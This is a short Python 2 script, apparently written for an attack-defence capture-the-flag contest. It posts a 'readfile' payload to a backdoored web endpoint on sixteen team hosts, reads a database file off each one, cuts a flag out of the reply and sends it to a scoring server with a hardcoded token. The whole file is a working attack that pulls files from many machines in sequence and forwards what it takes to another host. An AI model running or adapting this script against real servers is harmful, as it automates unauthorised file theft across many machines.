#!/usr/bin/env python

import httplib, urllib

def sendkey(key):
    conn = httplib.HTTPConnection("10.217.0.100")
    conn.request("GET",
    "/team/submit_key?token=7d6251fc73922705186fa2eb5bba3e60&key=%s" % (key))
    r1 = conn.getresponse()
    print r1.read()

for i in range(1, 17):
    params = urllib.urlencode({'1': 'a*', '2': 'readfile', '3':'/home/www-data/www/Hello/Runtime/Data/all_of_default.db'})
    headers = {"Content-type": "application/x-www-form-urlencoded"}
    conn = httplib.HTTPSConnection("10.217.%s.201"%(str(i)))
    conn.request("POST", "/Hello/", params, headers)
    response = conn.getresponse()
    print response.read()
    key = response.read()[6078:-90]
    print key
    sendkey(key)

